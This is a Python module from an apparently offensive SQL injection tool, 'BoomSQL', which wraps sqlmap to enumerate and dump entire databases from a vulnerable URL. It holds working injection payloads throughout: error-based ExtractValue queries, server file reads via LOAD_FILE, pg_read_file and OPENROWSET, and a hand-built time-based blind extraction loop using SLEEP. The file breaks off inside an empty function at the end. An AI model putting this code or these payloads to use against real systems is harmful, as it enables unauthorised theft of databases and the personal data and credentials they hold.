"""
Database Dumper for BoomSQL
Advanced database enumeration and dumping capabilities
Fast multi-threaded database extraction using SQLMap-style techniques
"""

import asyncio
import json
import csv
import xml.etree.ElementTree as ET
import os
import shutil
from typing import Dict, List, Optional, Any, Union
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import re
import time
import html
import threading
import concurrent.futures
import urllib.parse
import random
import string
import subprocess
import tempfile
import shutil

from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
from .sql_injection_engine import VulnerabilityResult, DatabaseType, InjectionType, InjectionVector
from .sqlmap_engine import SQLMapEngine, SQLMapTechnique
from .sqlmap_config import SQLMapConfig, DEFAULT_CONFIGS
from .logger import LoggerMixin

class ExportFormat(Enum):
    """Export formats"""
    JSON = "json"
    CSV = "csv"
    XML = "xml"
    SQL = "sql"
    HTML = "html"

@dataclass
class DatabaseInfo:
    """Database information"""
    name: str
    version: str
    user: str
    hostname: str
    port: int = 0
    tables: List['TableInfo'] = field(default_factory=list)
    
@dataclass
class TableInfo:
    """Table information"""
    name: str
    schema: str
    row_count: int
    columns: List['ColumnInfo'] = field(default_factory=list)
    data: List[Dict[str, Any]] = field(default_factory=list)
    
@dataclass
class ColumnInfo:
    """Column information"""
    name: str
    type: str
    length: int
    nullable: bool
    default: str = ""
    primary_key: bool = False
    
@dataclass
class DumpProgress:
    """Dump progress information"""
    current_database: str
    current_table: str
    current_column: str
    total_databases: int
    completed_databases: int
    total_tables: int
    completed_tables: int
    total_rows: int
    completed_rows: int
    start_time: datetime
    estimated_completion: datetime = None
    
    @property
    def progress_percentage(self) -> float:
        """Calculate overall progress percentage"""
        if self.total_rows == 0:
            return 0.0
        return (self.completed_rows / self.total_rows) * 100
        
    @property
    def time_elapsed(self) -> float:
        """Get elapsed time in seconds"""
        return (datetime.now() - self.start_time).total_seconds()
        
    @property
    def estimated_time_remaining(self) -> float:
        """Estimate time remaining in seconds"""
        if self.completed_rows == 0:
            return 0.0
        elapsed = self.time_elapsed
        rate = self.completed_rows / elapsed
        remaining_rows = self.total_rows - self.completed_rows
        return remaining_rows / rate if rate > 0 else 0.0

class DatabaseDumper(LoggerMixin):
    """Advanced database dumper with support for multiple database types"""
    
    def __init__(self, vulnerability: VulnerabilityResult, config: Dict[str, Any]):
        self.vulnerability = vulnerability
        self.config = config
        self.session = None
        self.database_info = None
        self.progress = None
        self.is_dumping = False
        self.cancel_requested = False
        
        # SQLMap configuration for GUI control
        self.sqlmap_config = SQLMapConfig()
        if 'sqlmap_config' in config:
            self.sqlmap_config = SQLMapConfig.from_gui_dict(config['sqlmap_config'])
        
        # Database-specific queries
        self.queries = self.get_database_queries()
        
        # Initialize session
        self.init_session()
        
    def update_sqlmap_config(self, gui_config: Dict[str, Any]):
        """Update SQLMap configuration from GUI"""
        self.sqlmap_config = SQLMapConfig.from_gui_dict(gui_config)
        self.log_info(f"Updated SQLMap config: {self.sqlmap_config.technique.value} technique, "
                     f"risk {self.sqlmap_config.risk.value}, level {self.sqlmap_config.level.value}")
    
    def get_sqlmap_config_for_gui(self) -> Dict[str, Any]:
        """Get SQLMap configuration for GUI display"""
        return self.sqlmap_config.to_gui_dict()
        
    def init_session(self):
        """Initialize aiohttp session"""
        if AIOHTTP_AVAILABLE:
            timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
            connector = aiohttp.TCPConnector(
                limit=self.config.get("MaxThreads", 3),
                ssl=False
            )
            
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={
                    'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
            )
        else:
            # Use fallback session
            self.session = ClientSession()
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    def get_database_queries(self) -> Dict[DatabaseType, Dict[str, str]]:
        """Get SQLMap-style database queries for real extraction"""
        return {
            DatabaseType.MYSQL: {
                "version": "SELECT version()",
                "user": "SELECT user()",
                "hostname": "SELECT @@hostname",
                "current_database": "SELECT database()",
                "databases": "SELECT GROUP_CONCAT(schema_name SEPARATOR '|') FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')",
                "tables": "SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()",
                "columns": "SELECT GROUP_CONCAT(CONCAT(column_name,'::',data_type,'::',is_nullable) SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT GROUP_CONCAT(CONCAT_WS('|',{columns}) SEPARATOR '||') FROM {table} LIMIT 1000",
                "privileges": "SELECT GROUP_CONCAT(privilege_type SEPARATOR '|') FROM information_schema.user_privileges WHERE grantee=CONCAT('\\'',user(),'\\'')",
                "files": "SELECT LOAD_FILE('{file}')",
                # SQLMap-style error-based extraction queries
                "error_based_version": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT version())))",
                "error_based_user": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT user())))",
                "error_based_database": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT database())))",
                "error_based_tables": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database())))",
                "error_based_columns": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}')))",
                "error_based_data": "SELECT ExtractValue(0x0a,CONCAT(0x0a,(SELECT GROUP_CONCAT(CONCAT_WS('|',{columns}) SEPARATOR '||') FROM {table} LIMIT 50)))"
            },
            DatabaseType.MSSQL: {
                "version": "SELECT @@version",
                "user": "SELECT SYSTEM_USER",
                "hostname": "SELECT @@servername",
                "current_database": "SELECT DB_NAME()",
                "databases": "SELECT STRING_AGG(name, '|') FROM sys.databases WHERE name NOT IN ('master', 'model', 'msdb', 'tempdb')",
                "tables": "SELECT STRING_AGG(name, '|') FROM sys.tables",
                "columns": "SELECT STRING_AGG(CONCAT(c.name,'::',t.name,'::',c.is_nullable), '|') FROM sys.columns c JOIN sys.types t ON c.user_type_id = t.user_type_id WHERE object_id = OBJECT_ID('{table}')",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT STRING_AGG({columns}, '|') FROM (SELECT {columns} FROM {table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) AS subquery",
                "privileges": "SELECT STRING_AGG(permission_name, '|') FROM fn_my_permissions(NULL, 'SERVER')",
                "files": "SELECT BulkColumn FROM OPENROWSET(BULK '{file}', SINGLE_BLOB) AS x"
            },
            DatabaseType.POSTGRESQL: {
                "version": "SELECT version()",
                "user": "SELECT current_user",
                "hostname": "SELECT inet_server_addr()",
                "current_database": "SELECT current_database()",
                "databases": "SELECT string_agg(datname, '|') FROM pg_database WHERE datname NOT IN ('postgres', 'template0', 'template1')",
                "tables": "SELECT string_agg(tablename, '|') FROM pg_tables WHERE schemaname='public'",
                "columns": "SELECT string_agg(column_name||'::'||data_type||'::'||is_nullable, '|') FROM information_schema.columns WHERE table_schema='public' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT string_agg({columns}, '|') FROM (SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}) AS subquery",
                "privileges": "SELECT string_agg(privilege_type, '|') FROM information_schema.table_privileges WHERE grantee=current_user",
                "files": "SELECT pg_read_file('{file}')"
            }
        }
        
    async def enumerate_database(self, callback=None) -> DatabaseInfo:
        """Database enumeration using real SQLMap binary"""
        self.log_info("Starting database enumeration with real SQLMap")
        
        # Get basic database info using SQLMap
        db_info = await self.sqlmap_get_database_info()
        
        if not db_info:
            self.log_error("Failed to get database info from SQLMap")
            # Fallback to default values
            db_info = {
                'name': 'unknown',
                'version': 'Unknown',
                'user': 'Unknown',
                'hostname': 'Unknown'
            }
        
        self.database_info = DatabaseInfo(
            name=db_info.get('name', 'unknown'),
            version=db_info.get('version', 'Unknown'),
            user=db_info.get('user', 'Unknown'),
            hostname=db_info.get('hostname', 'Unknown')
        )
        
        if callback:
            callback(f"Database: {self.database_info.name}")
            callback(f"Version: {self.database_info.version}")
            callback(f"User: {self.database_info.user}")
            
        # Get tables using SQLMap
        tables = await self.sqlmap_get_tables()
        
        if callback:
            callback(f"Found {len(tables)} tables")
            
        # Process each table
        for table_name in tables:
            try:
                if callback:
                    callback(f"Processing table: {table_name}")
                
                # Get columns for this table
                columns = await self.sqlmap_get_columns(table_name)
                
                column_list = []
                for col_info in columns:
                    column_list.append(ColumnInfo(
                        name=col_info.get('name', 'unknown'),
                        type=col_info.get('type', 'varchar'),
                        length=col_info.get('length', 255),
                        nullable=col_info.get('nullable', True)
                    ))
                
                # Get row count
                row_count = await self.sqlmap_get_row_count(table_name)
                
                table_info = TableInfo(
                    name=table_name,
                    schema=self.database_info.name,
                    row_count=row_count,
                    columns=column_list
                )
                self.database_info.tables.append(table_info)
                
                if callback:
                    callback(f"Table {table_name}: {len(column_list)} columns, {row_count} rows")
                    
            except Exception as e:
                self.log_error(f"Error processing table {table_name}: {str(e)}")
                
        self.log_info(f"SQLMap enumeration completed: {len(self.database_info.tables)} tables processed")
        return self.database_info
    
    async def sqlmap_get_database_info(self) -> Dict[str, str]:
        """Get database info using real SQLMap"""
        try:
            import subprocess
            import tempfile
            import os
            
            # Create temp directory for SQLMap output
            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
            
            # Use local SQLMap in core folder
            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
            
            # Build SQLMap command for database info
            cmd = [
                'python', sqlmap_path,
                '-u', self.vulnerability.url,
                '--technique', 'BEUTS',
                '--batch',
                '--no-logging',
                '--flush-session',
                '--output-dir', temp_dir,
                '--current-db',
                '--current-user',
                '--hostname',
                '--banner',
                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
            ]
            
            # Add parameter if known
            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
                if self.vulnerability.injection_point.name:
                    cmd.extend(['-p', self.vulnerability.injection_point.name])
            
            # Set environment
            env = os.environ.copy()
            
            self.log_info("SQLMap getting database info...")
            
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
                
                output = stdout.decode('utf-8', errors='ignore')
                
                # Parse SQLMap output
                info = {}
                lines = output.split('\n')
                
                for line in lines:
                    line = line.strip()
                    if 'current database:' in line.lower():
                        info['name'] = line.split(':', 1)[1].strip().strip("'\"")
                    elif 'current user:' in line.lower():
                        info['user'] = line.split(':', 1)[1].strip().strip("'\"")
                    elif 'hostname:' in line.lower():
                        info['hostname'] = line.split(':', 1)[1].strip().strip("'\"")
                    elif 'banner:' in line.lower() or 'web server operating system:' in line.lower():
                        info['version'] = line.split(':', 1)[1].strip().strip("'\"")
                
                return info
                
            except asyncio.TimeoutError:
                process.kill()
                self.log_error("SQLMap database info command timed out")
                return {}
            finally:
                # Clean up temp directory
                import shutil
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            self.log_error(f"SQLMap database info failed: {e}")
            return {}
    
    async def sqlmap_get_tables(self) -> List[str]:
        """Get tables using real SQLMap"""
        try:
            import subprocess
            import tempfile
            import os
            
            # Create temp directory for SQLMap output
            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
            
            # Use local SQLMap in core folder
            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
            
            # Build SQLMap command for tables
            cmd = [
                'python', sqlmap_path,
                '-u', self.vulnerability.url,
                '--technique', 'BEUTS',
                '--batch',
                '--no-logging',
                '--flush-session',
                '--output-dir', temp_dir,
                '--tables',
                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
            ]
            
            # Add parameter if known
            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
                if self.vulnerability.injection_point.name:
                    cmd.extend(['-p', self.vulnerability.injection_point.name])
            
            # Set current database if known
            if hasattr(self, 'database_info') and self.database_info:
                cmd.extend(['-D', self.database_info.name])
            
            # Set environment
            env = os.environ.copy()
            
            self.log_info("SQLMap getting tables...")
            
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
                
                output = stdout.decode('utf-8', errors='ignore')
                
                # Parse tables from SQLMap output
                tables = []
                lines = output.split('\n')
                
                capturing = False
                for line in lines:
                    line = line.strip()
                    
                    # Start capturing after "Database:" and table count
                    if 'tables:' in line.lower() and '[' in line:
                        capturing = True
                        continue
                    
                    # Stop capturing at next SQLMap section
                    if capturing and (line.startswith('[') or line.startswith('sqlmap')):
                        break
                        
                    if capturing and line and not line.startswith('---'):
                        # Remove table prefixes and clean up
                        clean_line = line.strip('| ')
                        if clean_line and not clean_line.startswith('+'):
                            tables.append(clean_line)
                
                return tables
                
            except asyncio.TimeoutError:
                process.kill()
                self.log_error("SQLMap tables command timed out")
                return []
            finally:
                # Clean up temp directory
                import shutil
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            self.log_error(f"SQLMap tables failed: {e}")
            return []
    
    async def sqlmap_get_columns(self, table_name: str) -> List[Dict[str, Any]]:
        """Get columns using real SQLMap"""
        try:
            import subprocess
            import tempfile
            import os
            
            # Create temp directory for SQLMap output
            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
            
            # Use local SQLMap in core folder
            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
            
            # Build SQLMap command for columns
            cmd = [
                'python', sqlmap_path,
                '-u', self.vulnerability.url,
                '--technique', 'BEUTS',
                '--batch',
                '--no-logging',
                '--flush-session',
                '--output-dir', temp_dir,
                '-T', table_name,
                '--columns',
                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
            ]
            
            # Add parameter if known
            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
                if self.vulnerability.injection_point.name:
                    cmd.extend(['-p', self.vulnerability.injection_point.name])
            
            # Set current database if known
            if hasattr(self, 'database_info') and self.database_info:
                cmd.extend(['-D', self.database_info.name])
            
            # Set environment
            env = os.environ.copy()
            
            self.log_info(f"SQLMap getting columns for {table_name}...")
            
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
                
                output = stdout.decode('utf-8', errors='ignore')
                
                # Parse columns from SQLMap output
                columns = []
                lines = output.split('\n')
                
                capturing = False
                for line in lines:
                    line = line.strip()
                    
                    # Start capturing after "columns:" 
                    if 'columns:' in line.lower() and '[' in line:
                        capturing = True
                        continue
                    
                    # Stop capturing at next SQLMap section
                    if capturing and (line.startswith('[') or line.startswith('sqlmap')):
                        break
                        
                    if capturing and line and '|' in line and not line.startswith('---'):
                        # Parse column info
                        parts = [p.strip() for p in line.split('|')]
                        if len(parts) >= 2:
                            col_info = {
                                'name': parts[0].strip(),
                                'type': parts[1].strip() if len(parts) > 1 else 'varchar',
                                'length': 255,
                                'nullable': True
                            }
                            columns.append(col_info)
                
                return columns
                
            except asyncio.TimeoutError:
                process.kill()
                self.log_error("SQLMap columns command timed out")
                return []
            finally:
                # Clean up temp directory
                import shutil
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            self.log_error(f"SQLMap columns failed: {e}")
            return []
    
    async def sqlmap_get_row_count(self, table_name: str) -> int:
        """Get row count using real SQLMap"""
        try:
            # Use SQL query to get count
            query = f"SELECT COUNT(*) FROM {table_name}"
            result = await self.execute_sqlmap_command(query)
            
            if result:
                # Try to parse the count
                import re
                numbers = re.findall(r'\d+', result)
                if numbers:
                    return int(numbers[0])
            
            return 0
            
        except Exception as e:
            self.log_error(f"SQLMap row count failed: {e}")
            return 0
        
    async def dump_database(self, database_info: DatabaseInfo = None, callback=None) -> DatabaseInfo:
        """Fast database dump using real SQLMap binary"""
        if database_info is None:
            database_info = self.database_info
            
        if not database_info:
            raise ValueError("Database information not available. Run enumerate_database first.")
            
        self.log_info("Starting real SQLMap database dump")
        self.is_dumping = True
        self.cancel_requested = False
        
        # Initialize progress
        total_rows = sum(table.row_count for table in database_info.tables)
        self.progress = DumpProgress(
            current_database="",
            current_table="",
            current_column="",
            total_databases=len(set(table.schema for table in database_info.tables)),
            completed_databases=0,
            total_tables=len(database_info.tables),
            completed_tables=0,
            total_rows=total_rows,
            completed_rows=0,
            start_time=datetime.now()
        )
        
        # Use real SQLMap for data extraction
        async def dump_table_data_with_sqlmap(table):
            """Dump table data using real SQLMap binary"""
            try:
                if self.cancel_requested:
                    return
                    
                self.progress.current_database = table.schema
                self.progress.current_table = table.name
                
                if callback:
                    callback(f"SQLMap dumping table: {table.schema}.{table.name}")
                
                # Get column names
                column_names = [col.name for col in table.columns]
                if not column_names:
                    column_names = ["*"]
                
                # Use real SQLMap to dump table
                extracted_data = await self.sqlmap_dump_table(table.name, column_names)
                
                if extracted_data:
                    table.data = extracted_data
                    table.row_count = len(extracted_data)
                    self.progress.completed_rows += len(extracted_data)
                    
                    self.log_info(f"SQLMap extracted {len(extracted_data)} rows from {table.name}")
                    if callback:
                        callback(f"✓ Extracted {len(extracted_data)} rows from {table.name}")
                else:
                    self.log_error(f"SQLMap failed to extract data from {table.name}")
                    table.data = []
                    if callback:
                        callback(f"✗ Failed to extract data from {table.name}")
                        
                self.progress.completed_tables += 1
                
            except Exception as e:
                self.log_error(f"Error dumping table {table.name}: {e}")
                table.data = []
                self.progress.completed_tables += 1
                if callback:
                    callback(f"✗ Error dumping {table.name}: {e}")
        
        # Execute table dumps sequentially (SQLMap doesn't handle parallel well)
        for table in database_info.tables:
            if self.cancel_requested:
                break
            await dump_table_data_with_sqlmap(table)
        
        self.is_dumping = False
        self.progress.end_time = datetime.now()
        
        total_extracted = sum(len(table.data) for table in database_info.tables)
        self.log_info(f"Real SQLMap dump completed: {total_extracted} total rows extracted")
        
        return database_info
    
    async def sqlmap_dump_table(self, table_name: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Dump table using real SQLMap binary"""
        try:
            import subprocess
            import tempfile
            import os
            
            # Create temp directory for SQLMap output
            temp_dir = tempfile.mkdtemp(prefix='sqlmap_')
            
            # Use local SQLMap in core folder
            sqlmap_path = os.path.join(os.path.dirname(__file__), 'sqlmap', 'sqlmap.py')
            
            # Build SQLMap command for table dump
            cmd = [
                'python', sqlmap_path,
                '-u', self.vulnerability.url,
                '--technique', 'BEUTS',  # All techniques
                '--batch',  # Non-interactive
                '--no-logging',
                '--flush-session',
                '--output-dir', temp_dir,
                '-T', table_name,
                '--dump',
                '--threads', '1',
                '--timeout', '30',
                '--retries', '2',
                '--answers', 'quit=N,crack=N,dict=N,continue=Y'
            ]
            
            # Add parameter if known
            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
                if self.vulnerability.injection_point.name:
                    cmd.extend(['-p', self.vulnerability.injection_point.name])
            
            # Set current database if known
            if hasattr(self, 'database_info') and self.database_info:
                cmd.extend(['-D', self.database_info.name])
            
            # Set environment
            env = os.environ.copy()
            
            self.log_info(f"SQLMap dumping table {table_name}: {' '.join(cmd)}")
            
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)  # 5 minute timeout
                
                # Parse output
                output = stdout.decode('utf-8', errors='ignore')
                error = stderr.decode('utf-8', errors='ignore')
                
                if process.returncode == 0:
                    # Look for CSV output file
                    csv_files = []
                    for root, dirs, files in os.walk(temp_dir):
                        for file in files:
                            if file.endswith('.csv') and table_name in file:
                                csv_files.append(os.path.join(root, file))
                    
                    if csv_files:
                        # Parse CSV file
                        import csv
                        rows = []
                        with open(csv_files[0], 'r', encoding='utf-8') as f:
                            reader = csv.DictReader(f)
                            for row in reader:
                                rows.append(dict(row))
                        
                        self.log_info(f"Parsed {len(rows)} rows from SQLMap CSV output")
                        return rows
                    else:
                        # Parse from stdout
                        return self.parse_sqlmap_dump_output(output, column_names)
                else:
                    self.log_error(f"SQLMap dump failed with code {process.returncode}: {error}")
                    return []
                    
            except asyncio.TimeoutError:
                process.kill()
                self.log_error("SQLMap dump command timed out")
                return []
            finally:
                # Clean up temp directory
                import shutil
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
        except Exception as e:
            self.log_error(f"SQLMap table dump failed: {e}")
            return []
    
    def parse_sqlmap_dump_output(self, output: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse SQLMap dump output to extract table data"""
        rows = []
        lines = output.split('\n')
        
        # Look for table data in SQLMap output
        capturing = False
        headers = []
        
        for line in lines:
            line = line.strip()
            
            # Start capturing after "Database:" or table name
            if 'entries' in line.lower() and 'table' in line.lower():
                capturing = True
                continue
            
            # Stop capturing at next SQLMap section
            if capturing and (line.startswith('[') or line.startswith('sqlmap') or line.startswith('---')):
                break
                
            if capturing and line and '|' in line:
                # This looks like tabular data
                parts = [part.strip() for part in line.split('|')]
                
                if not headers and len(parts) > 1:
                    # First data row, use as headers
                    headers = parts
                elif headers and len(parts) == len(headers):
                    # Data row
                    row = {}
                    for i, header in enumerate(headers):
                        row[header] = parts[i]
                    rows.append(row)
        
        return rows
    
    async def cancel_dump(self):
        """Cancel the current dump operation"""
        self.cancel_requested = True
        self.log_info("Dump cancellation requested")
        
    def get_progress(self) -> Optional[DumpProgress]:
        """Get current dump progress"""
        return self.progress
        
    async def execute_query(self, query: str) -> Optional[str]:
        """Execute a query using real SQLMap binary"""
        try:
            # Use real SQLMap binary for extraction
            result = await self.execute_sqlmap_command(query)
            
            if result:
                self.log_info(f"SQLMap extraction successful: {result[:50]}...")
                return result
            else:
                self.log_info("SQLMap extraction failed")
                return None
                
        except Exception as e:
            self.log_info(f"Query execution failed: {e}")
            return None
    
    async def execute_sqlmap_command(self, query: str) -> Optional[str]:
        """Execute SQLMap command with real binary"""
        try:
            import subprocess
            import tempfile
            import os
            
            # Create temp file for SQLMap output
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp_file:
                output_file = tmp_file.name
            
            # Get target parameter from vulnerability
            target_param = None
            if hasattr(self.vulnerability, 'injection_point') and self.vulnerability.injection_point:
                target_param = self.vulnerability.injection_point.name
            
            # Build SQLMap command using configuration
            cmd = self.sqlmap_config.to_cmdline_args(self.vulnerability.url, target_param)
            
            # Add SQL query
            cmd.extend(['--sql-query', query])
            
            # Add output directory
            cmd.extend(['--output-dir', '/tmp/sqlmap_output'])
            
            # Set timeout and environment
            env = os.environ.copy()
            
            self.log_info(f"Executing SQLMap: {' '.join(cmd)}")
            
            # Execute SQLMap
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=self.sqlmap_config.timeout + 30)
                
                # Parse output
                output = stdout.decode('utf-8', errors='ignore')
                error = stderr.decode('utf-8', errors='ignore')
                
                if process.returncode == 0:
                    # Extract result from SQLMap output
                    result = self.parse_sqlmap_output(output, query)
                    if result:
                        return result
                    else:
                        self.log_info("No data extracted from SQLMap output")
                        return None
                else:
                    self.log_error(f"SQLMap failed with code {process.returncode}: {error}")
                    return None
                    
            except asyncio.TimeoutError:
                process.kill()
                self.log_error("SQLMap command timed out")
                return None
            finally:
                # Clean up temp file
                if os.path.exists(output_file):
                    os.unlink(output_file)
                    
        except Exception as e:
            self.log_error(f"SQLMap execution failed: {e}")
            return None
    
    def parse_sqlmap_output(self, output: str, query: str) -> Optional[str]:
        """Parse SQLMap output to extract query results"""
        lines = output.split('\n')
        result_lines = []
        
        # Look for query results in SQLMap output
        capturing = False
        for line in lines:
            line = line.strip()
            
            # Start capturing after query execution
            if 'fetched data' in line.lower() or 'query:' in line.lower():
                capturing = True
                continue
            
            # Stop capturing at next SQLMap section
            if capturing and (line.startswith('[') or line.startswith('sqlmap')):
                break
                
            if capturing and line and not line.startswith('---'):
                result_lines.append(line)
        
        if result_lines:
            return '\n'.join(result_lines).strip()
        
        # Fallback: look for any data patterns
        for line in lines:
            if ('database' in query.lower() and 'current database' in line.lower()) or \
               ('version' in query.lower() and any(v in line for v in ['mysql', 'mariadb', 'postgresql', 'mssql'])) or \
               ('user' in query.lower() and '@' in line):
                # Extract the actual data
                parts = line.split(':')
                if len(parts) > 1:
                    return parts[-1].strip()
        
        return None

    def extract_error_result(self, content: str) -> Optional[str]:
        """Extract result from SQLMap-style error messages"""
        # SQLMap ExtractValue error patterns
        patterns = [
            r'XPATH syntax error:\s*\'([^\']+)\'',
            r'~([^~]+)~',
            r'ERROR 1105.*?\'([^\']+)\'',
            r'Duplicate entry \'([^\']+)\' for key',
            r'ERROR 1690.*?\'([^\']+)\'',
            r'UpdateXML.*?\'([^\']+)\'',
            r'Invalid XML.*?\'([^\']+)\'',
            r'ERROR 1062.*?\'([^\']+)\'',
            r'Subquery returns more than 1 row.*?\'([^\']+)\'',
            r'Data truncated.*?\'([^\']+)\''
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                result = match.group(1).strip()
                if result and len(result) > 0:
                    return result
                    
        return None

    async def time_based_extraction(self, query: str, max_length: int = 50) -> Optional[str]:
        """Extract data using time-based blind SQL injection"""
        try:
            result = ""
            self.log_info(f"Starting time-based extraction for: {query}")
            
            for pos in range(1, max_length + 1):
                found_char = False
                
                # Try common characters first (more efficient)
                chars_to_try = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._-@"
                
                for char in chars_to_try:
                    # Build time-based test query (without quotes since parameter is numeric)
                    char_test = f"1 AND IF((SELECT ASCII(SUBSTRING(({query}), {pos}, 1))) = {ord(char)}, SLEEP(2), 0)"
                    
                    modified_url, modified_data, modified_headers, modified_cookies = self.prepare_injection_request(char_test)
                    
                    if self.vulnerability.injection_point.vector == InjectionVector.GET_PARAMETER:
                        import time
                        start_time = time.time()
                        
                        try:
                            response = await asyncio.wait_for(
                                self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies),
                                timeout=5.0
                            )
                            await response.text()
                            elapsed = time.time() - start_time
                            
                            # If response took more than 1.5 seconds, the condition was true
                            if elapsed > 1.5:
                                result += char
                                found_char = True
                                self.log_info(f"Found character at position {pos}: '{char}' (delay: {elapsed:.2f}s)")
                                break
                        except asyncio.TimeoutError:
                            # Timeout means the condition was true (SLEEP executed)
                            result += char
                            found_char = True
                            self.log_info(f"Found character at position {pos}: '{char}' (timeout)")
                            break
                    
                    # Small delay between attempts
                    await asyncio.sleep(0.1)
                
                if not found_char:
                    # Test for end of string
                    end_test = f"1 AND IF(LENGTH(({query})) = {pos-1}, SLEEP(2), 0)"
                    modified_url, modified_data, modified_headers, modified_cookies = self.prepare_injection_request(end_test)
                    
                    import time
                    start_time = time.time()
                    
                    try:
                        response = await asyncio.wait_for(
                            self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies),
                            timeout=5.0
                        )
                        await response.text()
                        elapsed = time.time() - start_time
                        
                        if elapsed > 1.5:
                            self.log_info(f"Reached end of string at position {pos-1}")
                            break
                    except asyncio.TimeoutError:
                        self.log_info(f"Reached end of string at position {pos-1} (timeout)")
                        break
                    
                    # If no character found and not end of string, might be non-printable
                    self.log_info(f"No printable character found at position {pos}")
                    break
            
            return result if result else None
            
        except Exception as e:
            self.log_info(f"Time-based extraction failed: {e}")
            return None
            
    def prepare_injection_request(self, injection_query: str):
        """Prepare the injection request"""
        # This is a simplified version - in practice, you'd use the exact same
        # method as the original vulnerability was detected
        url = self.vulnerability.url
        injection_point = self.vulnerability.injection_point
        
        # Replace the original payload with our query
        if injection_point.vector == InjectionVector.GET_PARAMETER:
            # Modify URL parameter
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[injection_point.name] = [injection_query]
            query_string = urlencode(params, doseq=True)
            modified_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, query_string, parsed_url.fragment
            ))
            return modified_url, {}, {}, {}
            
        elif injection_point.vector == InjectionVector.POST_PARAMETER:
            # Modify POST data
            return url, {injection_point.name: injection_query}, {}, {}
            
        elif injection_point.vector == InjectionVector.HEADER:
            # Modify header
            return url, {}, {injection_point.name: injection_query}, {}
            
        elif injection_point.vector == InjectionVector.COOKIE:
            # Modify cookie
            return url, {}, {}, {injection_point.name: injection_query}
            
        return url, {}, {}, {}
        
    def extract_result(self, content: str) -> Optional[str]:
        """Extract query result from response content"""
        # Debug: log the content length for debugging
        self.log_info(f"Extracting from content length: {len(content)}")
        
        # Try multiple extraction patterns
        
